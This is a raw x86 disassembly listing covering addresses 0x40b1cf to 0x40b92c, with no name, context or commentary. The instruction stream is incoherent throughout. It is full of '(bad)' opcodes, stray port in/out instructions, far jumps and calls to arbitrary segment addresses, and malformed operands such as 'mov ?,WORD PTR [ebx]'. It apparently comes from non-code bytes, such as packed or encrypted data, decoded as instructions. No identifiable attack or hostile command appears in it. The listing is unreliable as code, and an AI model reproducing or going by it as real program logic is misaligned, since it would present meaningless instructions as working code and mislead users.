  40b1cf:	jg     0x40b226
  40b1d1:	fnstsw WORD PTR [ebx+0x7]
  40b1d4:	gs jecxz 0x40b218
  40b1d7:	lea    esp,[edi+ebx*4-0x68]
  40b1db:	cwde   
  40b1dc:	lahf   
  40b1dd:	sbb    BYTE PTR [ebp-0x58],bh
  40b1e0:	repnz (bad) 
  40b1e2:	fadd   QWORD PTR [ebx]
  40b1e4:	mov    dl,0xc7
  40b1e6:	mov    edx,DWORD PTR [ebp+0x7e0cdaed]
  40b1ec:	push   ss
  40b1ed:	(bad)  
  40b1ee:	cs xor ah,dl
  40b1f1:	push   edx
  40b1f2:	mov    eax,ebp
  40b1f4:	in     al,0xf
  40b1f6:	lahf   
  40b1f7:	and    DWORD PTR [esi-0x32],0x77
  40b1fb:	mov    ebx,0xaa587be4
  40b200:	mov    cl,0x5e
  40b202:	out    dx,al
  40b203:	jns    0x40b187
  40b205:	jmp    0x6cc0:0xb8794b6
  40b20c:	inc    ebp
  40b20d:	std    
  40b20e:	sub    BYTE PTR [edx],dh
  40b210:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b211:	hlt    
  40b212:	call   0xa4c027e0
  40b217:	in     al,dx
  40b218:	cmp    eax,0x9780333e
  40b21d:	pop    ebx
  40b21e:	popa   
  40b21f:	push   0xccf06bae
  40b224:	into   
  40b225:	xchg   esi,eax
  40b226:	mov    ss,WORD PTR [edx-0x5b]
  40b229:	fcomip st,st(2)
  40b22b:	rcl    BYTE PTR [edx+0x36f330d6],1
  40b231:	scas   eax,DWORD PTR es:[edi]
  40b232:	pop    ss
  40b233:	fild   WORD PTR [eax+0x3e]
  40b236:	das    
  40b237:	xchg   ebp,eax
  40b238:	and    eax,0x5dfaf19e
  40b23d:	fst    QWORD PTR [ecx+0x32]
  40b240:	dec    esp
  40b241:	push   ds
  40b242:	imul   DWORD PTR [eax]
  40b244:	jle    0x40b1f2
  40b246:	inc    esp
  40b247:	dec    ebp
  40b248:	mov    ebp,0x9e8bf6ec
  40b24d:	(bad)  [edx-0x8]
  40b250:	daa    
  40b251:	aas    
  40b252:	(bad)  
  40b253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b254:	stos   DWORD PTR es:[edi],eax
  40b255:	push   0x8568ab7
  40b25a:	aad    0xa0
  40b25c:	jno    0x40b248
  40b25e:	clc    
  40b25f:	mov    dl,0x16
  40b261:	mov    esi,0x5dcd0242
  40b266:	das    
  40b267:	mov    bh,0x27
  40b269:	inc    esp
  40b26a:	mov    eax,ds:0x8719bd8c
  40b26f:	test   DWORD PTR [edx+ecx*8-0x4c],esi
  40b273:	mov    dh,ah
  40b275:	pop    edi
  40b276:	mov    ebx,DWORD PTR ds:0x39048063
  40b27c:	add    esi,DWORD PTR [ebx]
  40b27e:	mov    al,BYTE PTR [eax+eax*4]
  40b281:	cmp    DWORD PTR [edi+0x18],0x5
  40b285:	dec    esp
  40b286:	ret    
  40b287:	ror    BYTE PTR [eax+0x72],cl
  40b28a:	cmp    ebx,DWORD PTR [ebx-0xf8c0645]
  40b290:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b291:	test   al,0x99
  40b293:	jnp    0x40b246
  40b295:	xor    al,0x1f
  40b297:	cmp    BYTE PTR [ecx-0x51e6e38c],bh
  40b29d:	rcr    dh,0x9a
  40b2a0:	dec    ebp
  40b2a1:	inc    edx
  40b2a2:	cwde   
  40b2a3:	fldcw  WORD PTR ds:0xa4b09ea9
  40b2a9:	dec    edi
  40b2aa:	repz out dx,al
  40b2ac:	mov    eax,0xa6841b61
  40b2b1:	jp     0x40b2b5
  40b2b3:	pop    esi
  40b2b4:	sub    DWORD PTR [esi+0x16],eax
  40b2b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2b8:	jne    0x40b311
  40b2ba:	arpl   WORD PTR [eax+0x6d],dx
  40b2bd:	adc    eax,0x82bfd3fc
  40b2c2:	add    al,0x98
  40b2c4:	jne    0x40b251
  40b2c6:	xor    bl,bl
  40b2c8:	sub    DWORD PTR [ecx-0x66],eax
  40b2cb:	in     al,0x5a
  40b2cd:	call   0x51dd:0x64bbcaa0
  40b2d4:	dec    edx
  40b2d5:	xlat   BYTE PTR ds:[ebx]
  40b2d6:	sbb    bl,dh
  40b2d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2d9:	je     0x40b2b8
  40b2db:	adc    eax,0xf5301617
  40b2e0:	add    eax,0xca100811
  40b2e5:	pushf  
  40b2e6:	out    0x33,eax
  40b2e8:	into   
  40b2e9:	xchg   BYTE PTR [ebp+0x7eacc052],ch
  40b2ef:	mov    es,WORD PTR [edi]
  40b2f1:	pop    esi
  40b2f2:	and    esp,DWORD PTR [eax+ebp*8-0x68b69b51]
  40b2f9:	std    
  40b2fa:	mov    ?,WORD PTR [ebx]
  40b2fc:	mov    dl,0xbd
  40b2fe:	mov    esi,0x30de7db3
  40b303:	xor    DWORD PTR [ebp+0x5d],ebx
  40b306:	or     BYTE PTR [ecx-0x64],ah
  40b309:	sbb    bh,BYTE PTR [ecx]
  40b30b:	sbb    al,BYTE PTR [esi]
  40b30d:	into   
  40b30e:	xor    DWORD PTR [ebp+0xb],edx
  40b311:	push   ecx
  40b312:	jg     0x40b2c0
  40b314:	xor    esi,esi
  40b316:	pop    ds
  40b317:	push   eax
  40b318:	add    DWORD PTR [ecx],esi
  40b31a:	mov    eax,ds:0x3bd902c5
  40b31f:	add    eax,0x58e65b20
  40b324:	dec    ebx
  40b325:	(bad)  
  40b326:	xchg   ebp,eax
  40b327:	retf   
  40b328:	into   
  40b329:	push   bp
  40b32b:	sbb    al,0x61
  40b32d:	into   
  40b32e:	cs pop esp
  40b330:	push   ecx
  40b331:	call   0xd644d3e8
  40b336:	and    DWORD PTR [ebp-0x56ce800f],edx
  40b33c:	pushf  
  40b33d:	push   es
  40b33e:	ins    DWORD PTR es:[edi],dx
  40b33f:	in     al,dx
  40b340:	ins    DWORD PTR es:[edi],dx
  40b341:	pop    ds
  40b342:	sbb    DWORD PTR [eax-0x16],edi
  40b345:	mov    ah,0x93
  40b347:	xor    dl,BYTE PTR [ebp-0x556e94de]
  40b34d:	xchg   ebp,eax
  40b34e:	sar    BYTE PTR [ebp+0x79],0x62
  40b352:	fld    QWORD PTR [edi]
  40b354:	lea    eax,[esi+0x2f381e0c]
  40b35a:	and    eax,0x6c4c96
  40b35f:	mov    edi,DWORD PTR [eax]
  40b361:	cwde   
  40b362:	xor    DWORD PTR [eax+esi*1+0x5d],edi
  40b366:	sub    eax,DWORD PTR ds:0x62f1209f
  40b36c:	in     eax,0x4d
  40b36e:	ins    BYTE PTR es:[edi],dx
  40b36f:	jo     0x40b3ab
  40b371:	aam    0x63
  40b373:	fidiv  WORD PTR [edi]
  40b375:	clc    
  40b376:	cmp    eax,0x1ff4f95e
  40b37b:	dec    ebx
  40b37c:	stc    
  40b37d:	jle    0x40b3cf
  40b37f:	pop    ds
  40b380:	mov    ch,0xd
  40b382:	pop    es
  40b383:	jge    0x40b334
  40b385:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b386:	jmp    0x9bc9:0x685418be
  40b38d:	loopne 0x40b372
  40b38f:	lods   eax,DWORD PTR ds:[esi]
  40b390:	pop    ds
  40b391:	sbb    BYTE PTR [eax+0x5c],ah
  40b394:	pop    edx
  40b395:	push   ecx
  40b396:	and    esp,ebx
  40b398:	leave  
  40b399:	fdivr  QWORD PTR [ecx+0x730dda4b]
  40b39f:	outs   dx,DWORD PTR ds:[esi]
  40b3a0:	mov    dh,BYTE PTR [ecx+0x2d]
  40b3a3:	jnp    0x40b38d
  40b3a5:	imul   edi,DWORD PTR [ebx],0xffffffd5
  40b3a8:	and    DWORD PTR [ecx],edi
  40b3aa:	jl     0x40b3ee
  40b3ac:	out    0x46,eax
  40b3ae:	xchg   ebx,eax
  40b3af:	add    BYTE PTR [ebx-0x6a68e6c1],0xfc
  40b3b6:	xchg   ebx,eax
  40b3b7:	adc    DWORD PTR ds:0xad275978,0x2cd7e768
  40b3c1:	ins    BYTE PTR es:[edi],dx
  40b3c2:	xchg   BYTE PTR [ecx],dl
  40b3c4:	loope  0x40b418
  40b3c6:	jbe    0x40b36f
  40b3c8:	in     eax,0x24
  40b3ca:	dec    ebx
  40b3cb:	lahf   
  40b3cc:	sub    DWORD PTR [edi+0x551e20dc],esp
  40b3d2:	arpl   WORD PTR [ebp+0x2a2cd5de],di
  40b3d8:	push   ecx
  40b3d9:	inc    DWORD PTR [eax-0x3d621677]
  40b3df:	xor    BYTE PTR [eax+0xc],0x3b
  40b3e3:	pop    esp
  40b3e4:	sub    eax,0xbe252f51
  40b3e9:	push   esi
  40b3ea:	sbb    dl,BYTE PTR [edi+0x3]
  40b3ed:	mov    al,ds:0x8c7dc041
  40b3f2:	ret    0x326f
  40b3f5:	sub    eax,DWORD PTR [esi+0x1aa062ca]
  40b3fb:	(bad)
  40b3fe:	pusha  
  40b3ff:	xor    DWORD PTR [edx-0x6d85c66a],esp
  40b405:	fwait
  40b406:	imul   eax,ecx,0x74dccdb9
  40b40c:	jno    0x40b459
  40b40e:	pop    ds
  40b40f:	jne    0x40b42e
  40b411:	in     al,0xad
  40b413:	or     BYTE PTR [esi],bh
  40b415:	scas   al,BYTE PTR es:[edi]
  40b416:	cmp    BYTE PTR [ebp+0x41e6fc83],cl
  40b41c:	out    0x80,al
  40b41e:	sub    BYTE PTR [ebx+0xb],dl
  40b421:	sbb    ebp,eax
  40b423:	xchg   ebp,eax
  40b424:	pop    ds
  40b425:	push   ebx
  40b426:	dec    esi
  40b427:	mov    dh,0xc1
  40b429:	fs (bad) 
  40b42b:	jnp    0x40b48a
  40b42d:	bound  esi,QWORD PTR [ebp-0x11]
  40b430:	lock mov ds:0x47f27915,al
  40b436:	push   esi
  40b437:	mov    ebx,0x55f7d469
  40b43c:	xchg   BYTE PTR [edx-0x2d],bh
  40b43f:	cmp    cl,BYTE PTR [ecx]
  40b441:	shr    BYTE PTR [ebp-0x55],0x67
  40b445:	sub    al,0xff
  40b447:	or     ch,BYTE PTR [ecx-0x60db50e8]
  40b44d:	xor    DWORD PTR [ebp+ebp*2-0x3d0cd53],ecx
  40b454:	repz (bad) 
  40b456:	and    ch,BYTE PTR [ecx]
  40b458:	xchg   edx,eax
  40b459:	xlat   BYTE PTR ds:[ebx]
  40b45a:	je     0x40b4d1
  40b45c:	xor    DWORD PTR [edi],esi
  40b45e:	inc    esp
  40b45f:	mov    ebx,0x72ef2ac3
  40b464:	in     al,0xd6
  40b466:	sbb    eax,0xac72d220
  40b46b:	daa    
  40b46c:	xor    al,0xf8
  40b46e:	inc    eax
  40b46f:	fsubrp st(4),st
  40b471:	pop    esi
  40b472:	xchg   ebp,eax
  40b473:	(bad)  
  40b474:	dec    esp
  40b475:	adc    BYTE PTR [ebx-0x19d5523d],ch
  40b47b:	(bad)  
  40b47c:	repz mov ax,0x8f26
  40b481:	push   ebp
  40b482:	mov    DWORD PTR [ecx-0x49a65640],ecx
  40b488:	jne    0x40b4c4
  40b48a:	or     BYTE PTR [esi-0x1586e7c0],dl
  40b490:	clc    
  40b491:	in     al,0xe3
  40b493:	cmc    
  40b494:	loop   0x40b418
  40b496:	pop    ecx
  40b497:	repz mov dl,0x8
  40b49a:	adc    BYTE PTR [edx+0x6707a0f0],dl
  40b4a0:	call   0x75ce:0xc4dd835a
  40b4a7:	dec    ecx
  40b4a8:	mov    DWORD PTR [esi],ecx
  40b4aa:	ret    0x187
  40b4ad:	mov    eax,ds:0x8eb4f31e
  40b4b2:	dec    ecx
  40b4b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4b4:	test   al,0xde
  40b4b6:	and    DWORD PTR [eax],edi
  40b4b8:	push   edi
  40b4b9:	xor    al,BYTE PTR [eax+esi*1-0x4c488904]
  40b4c0:	(bad)  
  40b4c1:	sbb    ch,BYTE PTR [edi+0x1b7d676a]
  40b4c7:	das    
  40b4c8:	in     eax,dx
  40b4c9:	jmp    0x40b4c7
  40b4cb:	shl    DWORD PTR [edx+edx*2-0x65],0xf0
  40b4d0:	shr    BYTE PTR [esi+0x4e],cl
  40b4d3:	xchg   edi,eax
  40b4d4:	inc    edi
  40b4d5:	int3   
  40b4d6:	adc    cl,BYTE PTR [esi-0x73]
  40b4d9:	(bad)  
  40b4da:	shl    BYTE PTR [eax],cl
  40b4dc:	pop    ebx
  40b4dd:	sub    ebx,DWORD PTR [edi+0x6eb50a1a]
  40b4e3:	cdq    
  40b4e4:	imul   esp,DWORD PTR [ebp-0x7a9723c3],0xfc62ec82
  40b4ee:	xor    esp,DWORD PTR [esi-0x4450de50]
  40b4f4:	mov    ds:0xf4a643af,eax
  40b4f9:	dec    ebx
  40b4fa:	ja     0x40b47d
  40b4fc:	push   0xf4943b8a
  40b501:	enter  0x62,0x4
  40b505:	jno    0x40b51a
  40b507:	inc    esp
  40b508:	pop    eax
  40b509:	jae    0x40b524
  40b50b:	jmp    0x40b4a9
  40b50d:	add    al,0xc5
  40b50f:	xchg   esi,eax
  40b510:	ret    
  40b511:	(bad)  
  40b512:	leave  
  40b513:	jbe    0x40b4e4
  40b515:	nop
  40b516:	test   al,0xc9
  40b518:	out    0x5e,eax
  40b51a:	out    0xf6,eax
  40b51c:	push   cs
  40b51d:	jg     0x40b525
  40b51f:	call   0xf0217f44
  40b524:	and    BYTE PTR [esi+esi*1-0x26],bl
  40b528:	sub    BYTE PTR [edx-0x4134299d],dh
  40b52e:	loop   0x40b5a1
  40b530:	mov    ds,edi
  40b532:	pop    ss
  40b533:	mov    ds:0xfe818543,al
  40b538:	xchg   esp,eax
  40b539:	pop    ebx
  40b53a:	and    DWORD PTR [eax+0x50],eax
  40b53d:	inc    eax
  40b53e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b53f:	or     eax,DWORD PTR [esi-0x46]
  40b542:	(bad)  
  40b543:	retf   
  40b544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b545:	mov    edx,0x339ba2e4
  40b54a:	sub    al,0xee
  40b54c:	inc    ebx
  40b54d:	lock pop ss
  40b54f:	or     eax,0x782124a4
  40b554:	retf   
  40b555:	or     eax,0xb29c6f10
  40b55a:	ja     0x40b503
  40b55c:	mov    ds:0x9a9ad034,al
  40b561:	mov    ah,0xe7
  40b563:	mov    dh,0x4e
  40b565:	stos   BYTE PTR es:[edi],al
  40b566:	sbb    al,0xa9
  40b568:	pusha  
  40b569:	jae    0x40b52d
  40b56b:	call   0xc93a:0x6d445645
  40b572:	ins    BYTE PTR es:[edi],dx
  40b573:	add    DWORD PTR [edi-0x4144c308],esi
  40b579:	dec    esp
  40b57a:	mov    dl,0xa
  40b57c:	popa   
  40b57d:	lds    edx,FWORD PTR [edi]
  40b57f:	jmp    0x40b5dc
  40b581:	nop
  40b582:	ds push 0xf85d9f5
  40b588:	jns    0x40b598
  40b58a:	iret   
  40b58b:	int3   
  40b58c:	mov    edi,0x5ed7d8ab
  40b591:	dec    ebp
  40b592:	ja     0x40b55b
  40b594:	aad    0xff
  40b596:	jle    0x40b533
  40b598:	jbe    0x40b535
  40b59a:	leave  
  40b59b:	mov    bh,0xa2
  40b59d:	das    
  40b59e:	xor    al,0x5
  40b5a0:	shr    BYTE PTR [ebp+0x47],cl
  40b5a3:	inc    edx
  40b5a4:	imul   ebx,DWORD PTR [esi-0x72847bf0],0x73
  40b5ab:	dec    edi
  40b5ac:	gs call 0xa725:0x72606197
  40b5b4:	aas    
  40b5b5:	ins    BYTE PTR es:[edi],dx
  40b5b6:	mov    DWORD PTR [ebp+0x5d],esp
  40b5b9:	push   cs
  40b5ba:	inc    ecx
  40b5bb:	fst    DWORD PTR [eax-0x39]
  40b5be:	rcr    DWORD PTR [edx-0x35],cl
  40b5c1:	test   BYTE PTR [edx+0x55],0x5c
  40b5c5:	scas   al,BYTE PTR es:[edi]
  40b5c6:	cdq    
  40b5c7:	adc    DWORD PTR [esi-0x17],0xe7d1f748
  40b5ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5cf:	(bad)  
  40b5d0:	inc    edi
  40b5d1:	push   eax
  40b5d2:	jne    0x40b561
  40b5d4:	scas   al,BYTE PTR es:[edi]
  40b5d5:	call   0x3da4:0xff1c88b6
  40b5dc:	neg    BYTE PTR [ecx+0xf]
  40b5df:	int    0x12
  40b5e1:	adc    al,0xf5
  40b5e3:	mov    eax,ds:0xf6fc1cfa
  40b5e8:	add    DWORD PTR [edi],esp
  40b5ea:	xchg   ebx,eax
  40b5eb:	es aam 0x7d
  40b5ee:	pop    es
  40b5ef:	cmovno esi,ecx
  40b5f2:	fisttp DWORD PTR [edx+eax*4]
  40b5f5:	pop    es
  40b5f6:	xchg   DWORD PTR [ebx+0x5e],ebp
  40b5f9:	popa   
  40b5fa:	xchg   ecx,eax
  40b5fb:	mov    al,0xd2
  40b5fd:	cmp    bl,BYTE PTR [ebx]
  40b5ff:	cmc    
  40b600:	push   esi
  40b601:	xchg   cl,cl
  40b603:	mov    dl,0xca
  40b605:	jo     0x40b616
  40b607:	xchg   esi,eax
  40b608:	stos   BYTE PTR es:[edi],al
  40b609:	mov    ebp,0xc04cee79
  40b60e:	mov    ds:0xa8532299,al
  40b613:	aaa    
  40b614:	cmp    dl,dl
  40b616:	sbb    BYTE PTR [edi+eiz*2],ch
  40b619:	or     eax,0xbf8219e
  40b61e:	cld    
  40b61f:	fwait
  40b620:	push   esi
  40b621:	or     edx,0xc1cc83ce
  40b627:	enter  0x8de7,0xd9
  40b62b:	jl     0x40b5fb
  40b62d:	(bad)  
  40b62e:	test   eax,0x90d00ad8
  40b633:	je     0x40b66f
  40b635:	js     0x40b663
  40b637:	pop    ecx
  40b638:	mov    ecx,0x9a502715
  40b63d:	loop   0x40b62f
  40b63f:	xor    ah,bl
  40b641:	mov    al,ds:0x535bc64
  40b646:	jne    0x40b5d9
  40b648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b649:	ins    BYTE PTR es:[edi],dx
  40b64a:	out    0x4d,eax
  40b64c:	test   BYTE PTR [esi-0x66e8bd86],cl
  40b652:	(bad)  
  40b653:	fistp  WORD PTR [esi]
  40b655:	les    esp,FWORD PTR [esp+ebp*2-0x1d7f32e6]
  40b65c:	imul   edx,DWORD PTR gs:[ebx],0xffffffc0
  40b660:	aaa    
  40b661:	mov    bl,0x7c
  40b663:	pop    ss
  40b664:	inc    ecx
  40b665:	mov    eax,0xaaa4edbe
  40b66a:	ja     0x40b644
  40b66c:	dec    esp
  40b66d:	pop    ebp
  40b66e:	leave  
  40b66f:	out    0x6a,eax
  40b671:	retf   
  40b672:	xor    esp,edi
  40b674:	adc    BYTE PTR [edx],bh
  40b676:	xchg   edx,eax
  40b677:	inc    edx
  40b678:	jp     0x40b69f
  40b67a:	std    
  40b67b:	enter  0xf02c,0xfb
  40b67f:	sub    eax,0xfbd49a3a
  40b684:	sar    BYTE PTR [ebp+0x513dda64],cl
  40b68a:	jo     0x40b631
  40b68c:	inc    edi
  40b68d:	mov    BYTE PTR [esi+0x16d2864b],0x51
  40b694:	test   al,0x73
  40b696:	and    ecx,DWORD PTR [esi-0x3cbf123d]
  40b69c:	in     eax,dx
  40b69d:	out    dx,al
  40b69e:	xchg   esi,eax
  40b69f:	jg     0x40b62d
  40b6a1:	fimul  WORD PTR [eax]
  40b6a3:	push   edi
  40b6a4:	jae    0x40b6e8
  40b6a6:	scas   eax,DWORD PTR es:[edi]
  40b6a7:	(bad)  
  40b6a8:	int    0x48
  40b6aa:	shl    DWORD PTR [eax],0x51
  40b6ad:	inc    edx
  40b6ae:	in     eax,0x7a
  40b6b0:	loopne 0x40b662
  40b6b2:	enter  0x74bf,0xfb
  40b6b6:	shl    DWORD PTR [eax+eiz*1],1
  40b6b9:	aam    0x9e
  40b6bb:	push   cs
  40b6bc:	jle    0x40b63f
  40b6be:	test   BYTE PTR [edi],ah
  40b6c0:	and    DWORD PTR [edx+edx*1+0x213f9274],ebp
  40b6c7:	out    0x48,al
  40b6c9:	inc    edi
  40b6ca:	sahf   
  40b6cb:	pop    ecx
  40b6cc:	jne    0x40b665
  40b6ce:	aaa    
  40b6cf:	sub    cl,BYTE PTR [ebp-0x490bf1b]
  40b6d5:	dec    eax
  40b6d6:	in     eax,dx
  40b6d7:	adc    edx,DWORD PTR [eax+0x646fde02]
  40b6dd:	inc    ebx
  40b6de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6df:	lock es and eax,0x27fa1961
  40b6e6:	lock inc ebx
  40b6e8:	iret   
  40b6e9:	sbb    eax,0x8e83dd74
  40b6ee:	mov    ds:0x14e5d9c,al
  40b6f3:	lds    esi,FWORD PTR [eax]
  40b6f5:	add    ah,BYTE PTR [esi+0x67]
  40b6f8:	sub    cl,dh
  40b6fa:	jbe    0x40b70d
  40b6fc:	(bad)  
  40b6fd:	aam    0xfb
  40b6ff:	xor    eax,0xd4ccacf2
  40b704:	call   0x1d8a:0x93707c2e
  40b70b:	lea    edi,[eax+0x6e]
  40b70e:	sub    edx,DWORD PTR [ebp-0x1]
  40b711:	sahf   
  40b712:	pop    eax
  40b713:	out    dx,eax
  40b714:	stc    
  40b715:	loope  0x40b6f4
  40b717:	(bad)  
  40b718:	xchg   edi,eax
  40b719:	adc    BYTE PTR [eax],0xa7
  40b71c:	out    dx,al
  40b71d:	enter  0x6b94,0x0
  40b721:	dec    ebp
  40b722:	sub    bh,dh
  40b724:	dec    esi
  40b725:	retf   0x3334
  40b728:	mov    bl,0x3a
  40b72a:	lahf   
  40b72b:	in     eax,dx
  40b72c:	or     dh,BYTE PTR [ebp+0x27]
  40b72f:	div    ch
  40b731:	inc    ebx
  40b732:	fucomp st(5)
  40b734:	int    0xd2
  40b736:	pop    edx
  40b737:	mov    ?,WORD PTR [ebx]
  40b739:	int3   
  40b73a:	jae    0x40b71a
  40b73c:	int3   
  40b73d:	push   eax
  40b73e:	cmp    ebp,DWORD PTR [edi+0x1a0819aa]
  40b744:	daa    
  40b745:	leave  
  40b746:	push   ebx
  40b747:	xor    eax,0x9764f950
  40b74c:	(bad)  
  40b74d:	stos   BYTE PTR es:[edi],al
  40b74e:	mov    ebx,0x6df01cf6
  40b753:	adc    bl,0xb4
  40b756:	cld    
  40b757:	push   edx
  40b758:	stc    
  40b759:	out    0x4,eax
  40b75b:	cs nop
  40b75d:	adc    ebp,0x70
  40b760:	mov    esp,DWORD PTR [edi-0x40fb53ae]
  40b766:	mov    ah,0x33
  40b768:	es and al,0x7c
  40b76b:	jbe    0x40b7bc
  40b76d:	or     eax,0x2e7c4847
  40b772:	shl    DWORD PTR fs:[edx*2+0x59441584],0xcb
  40b77b:	(bad)  
  40b77c:	popf   
  40b77d:	repnz cmp cl,bh
  40b780:	sub    eax,0x758f65bc
  40b785:	sbb    DWORD PTR [ebp+0x4466472a],0xe28b2589
  40b78f:	arpl   WORD PTR [esi+ebx*2],sp
  40b792:	cli    
  40b793:	dec    eax
  40b794:	(bad)  
  40b795:	out    0x5c,al
  40b797:	jae    0x40b796
  40b799:	stos   DWORD PTR es:[edi],eax
  40b79a:	scas   eax,DWORD PTR es:[edi]
  40b79b:	shl    DWORD PTR [ebx-0x6478f901],1
  40b7a1:	or     DWORD PTR [ebp-0xe5bcd0f],edi
  40b7a7:	and    esi,DWORD PTR [ecx+0x24790fc0]
  40b7ad:	sub    ebp,DWORD PTR [edx-0x59c56e91]
  40b7b3:	daa    
  40b7b4:	xchg   ebp,eax
  40b7b5:	inc    ebx
  40b7b6:	pop    ebp
  40b7b7:	leave  
  40b7b8:	push   ss
  40b7b9:	xchg   esp,eax
  40b7ba:	and    al,BYTE PTR [eax-0x1438dc1d]
  40b7c0:	into   
  40b7c1:	add    esi,eax
  40b7c3:	cwde   
  40b7c4:	mov    esi,0xb202621f
  40b7c9:	loop   0x40b82d
  40b7cb:	cs mov ch,0x74
  40b7ce:	cli    
  40b7cf:	inc    esp
  40b7d0:	sub    al,0x19
  40b7d2:	ins    BYTE PTR es:[edi],dx
  40b7d3:	loop   0x40b774
  40b7d5:	das    
  40b7d6:	push   es
  40b7d7:	clc    
  40b7d8:	popa   
  40b7d9:	mov    ecx,0x75cfc973
  40b7de:	and    bl,ah
  40b7e0:	mov    bh,0x16
  40b7e2:	bound  ebp,QWORD PTR [esi-0x4]
  40b7e5:	mov    es,WORD PTR [edi]
  40b7e7:	int    0xfa
  40b7e9:	sbb    DWORD PTR cs:[edx],0x79e8c144
  40b7f0:	bound  ebp,QWORD PTR [edx]
  40b7f2:	jl     0x40b839
  40b7f4:	lods   eax,DWORD PTR ds:[esi]
  40b7f5:	fdivr  QWORD PTR [ecx-0x7435804]
  40b7fb:	or     BYTE PTR [edx],ch
  40b7fd:	mov    ecx,0x408d6a65
  40b802:	retf   
  40b803:	fldenv ds:0x68cd93af
  40b809:	cmp    al,0xd6
  40b80b:	sub    DWORD PTR [eax+0x470fa52e],edi
  40b811:	dec    esi
  40b812:	repnz mov al,ds:0xe3595684
  40b818:	jb     0x40b825
  40b81a:	mov    ecx,0xcca08ff9
  40b81f:	hlt    
  40b820:	test   BYTE PTR [ebx+0x6fc289f4],ah
  40b826:	fwait
  40b827:	cld    
  40b828:	add    ebx,DWORD PTR [eax]
  40b82a:	push   0x3a7de104
  40b82f:	mov    ebx,0x4ad748a3
  40b834:	sbb    bl,ah
  40b836:	cdq    
  40b837:	gs mov dl,0xed
  40b83a:	cmp    dh,BYTE PTR [ecx]
  40b83c:	add    BYTE PTR [esi],dh
  40b83e:	imul   DWORD PTR [esi]
  40b840:	stos   DWORD PTR es:[edi],eax
  40b841:	pop    esi
  40b842:	pop    eax
  40b843:	sbb    al,0x13
  40b845:	sbb    cl,dh
  40b847:	and    al,0x6c
  40b849:	inc    edi
  40b84a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b84b:	and    DWORD PTR [ebp-0x29],edi
  40b84e:	and    ebp,DWORD PTR [edi+0x77]
  40b851:	jnp    0x40b8ae
  40b853:	jae    0x40b879
  40b855:	ins    DWORD PTR es:[edi],dx
  40b856:	out    dx,al
  40b857:	mov    BYTE PTR [eax],ch
  40b859:	retf   0xedd4
  40b85c:	or     ch,BYTE PTR [ebx+0x4cf5d33d]
  40b862:	jmp    0x40b806
  40b864:	xchg   esp,eax
  40b865:	fwait
  40b866:	dec    esp
  40b867:	fcomi  st,st(1)
  40b869:	xchg   ebp,eax
  40b86a:	push   ebp
  40b86b:	cmp    esi,0x2225ddfe
  40b871:	jno    0x40b8ad
  40b873:	lahf   
  40b874:	imul   ecx,DWORD PTR [ecx-0x4c],0xffffffe5
  40b878:	imul   BYTE PTR [ecx]
  40b87a:	xchg   al,ch
  40b87c:	ins    BYTE PTR es:[edi],dx
  40b87d:	ja     0x40b805
  40b87f:	push   ds
  40b880:	xchg   ebp,eax
  40b881:	lods   al,BYTE PTR ds:[esi]
  40b882:	repnz pop ds
  40b884:	fadd   DWORD PTR [ebx-0x4d]
  40b887:	les    ebp,FWORD PTR [ecx-0x2c]
  40b88a:	mov    ecx,0xdcd0b9c0
  40b88f:	xor    esi,DWORD PTR [eax-0x6eacbb9f]
  40b895:	and    DWORD PTR [ecx+0x51],0x84ea3fdc
  40b89c:	mov    dl,0xcc
  40b89e:	shl    BYTE PTR [eax+0x33],0x4
  40b8a2:	ins    BYTE PTR es:[edi],dx
  40b8a3:	aas    
  40b8a4:	fwait
  40b8a5:	js     0x40b8fe
  40b8a7:	retf   0x1734
  40b8aa:	pop    ss
  40b8ab:	(bad)  
  40b8ac:	jbe    0x40b892
  40b8ae:	stos   DWORD PTR es:[edi],eax
  40b8af:	nop
  40b8b0:	(bad)  
  40b8b1:	mov    edx,0x72d3d5d6
  40b8b6:	or     al,0xe9
  40b8b8:	push   edx
  40b8b9:	imul   ebp,DWORD PTR ds:0xf9dc3cfb,0x69
  40b8c0:	adc    dh,0x54
  40b8c3:	add    al,0xe7
  40b8c5:	jmp    0x40b8ff
  40b8c7:	dec    eax
  40b8c8:	xchg   edi,eax
  40b8c9:	or     DWORD PTR ds:0x379e7bf7,esi
  40b8cf:	push   esp
  40b8d0:	xor    al,BYTE PTR [edx]
  40b8d2:	pop    eax
  40b8d3:	sub    eax,0xf6263909
  40b8d8:	mov    ecx,0x82ae4fd
  40b8dd:	pop    ss
  40b8de:	jp     0x40b89a
  40b8e0:	jnp    0x40b934
  40b8e2:	fwait
  40b8e3:	cwde   
  40b8e4:	pushf  
  40b8e5:	mov    ds:0x444df727,al
  40b8ea:	jp     0x40b8fd
  40b8ec:	repnz (bad) 
  40b8ee:	push   ds
  40b8ef:	inc    ebp
  40b8f0:	jb     0x40b90e
  40b8f2:	xor    dh,cl
  40b8f4:	test   DWORD PTR [ebx-0x2678e9ed],0xf80761be
  40b8fe:	popa   
  40b8ff:	arpl   WORD PTR [ecx+0x59],sp
  40b902:	in     al,0xd5
  40b904:	and    bl,ah
  40b906:	push   ebx
  40b907:	cmp    eax,0x349c85aa
  40b90c:	aad    0x5c
  40b90e:	mov    bh,0x7f
  40b910:	in     eax,dx
  40b911:	enter  0x99e0,0xa9
  40b915:	scas   eax,DWORD PTR es:[edi]
  40b916:	xor    bl,BYTE PTR [esi-0x654b6b76]
  40b91c:	jmp    0x40b8c9
  40b91e:	push   0x12
  40b920:	jecxz  0x40b901
  40b922:	and    esi,edx
  40b924:	retf   
  40b925:	cmp    edx,DWORD PTR [edi-0x7fb6be]
  40b92b:	ins    DWORD PTR es:[edi],dx
  40b92c:	imul   edi,DWORD PTR [ebx-0x4b9ffcaf],0xffffff9a
